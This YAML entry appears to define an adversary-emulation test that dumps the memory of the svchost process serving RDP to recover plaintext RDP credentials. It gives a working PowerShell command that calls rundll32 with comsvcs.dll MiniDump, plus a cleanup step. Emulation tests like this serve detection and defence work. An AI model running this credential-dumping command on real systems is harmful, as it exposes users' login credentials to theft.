- id: 4bbb22d4-11af-5707-ba0c-2d1e763cba80
  name: Soumaia ART Tests - Dump svchost.exe to gather RDP credentials
  description: 'The svchost.exe contains the RDP plain-text credentials.

    Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/


    Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp. (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003
    name: OS Credential Dumping
  platforms:
    windows:
      psh:
        command: |-
          $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
          if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
          C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
        cleanup: |-
          Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
